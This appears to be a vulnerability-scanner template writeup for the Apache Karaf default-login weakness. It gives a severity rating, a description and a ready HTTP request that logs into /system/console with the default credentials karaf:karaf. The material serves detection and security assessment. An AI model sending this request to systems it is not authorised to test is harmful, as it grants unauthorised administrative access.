# Nuclei Template: Apache Karaf - Default Login
**Template ID:** karaf-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`karaf-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Karaf contains a default login vulnerability. Default login credentials were detected. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /system/console HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64('karaf:karaf')}}
```

## References
- https://karaf.apache.org/manual/latest/webconsole
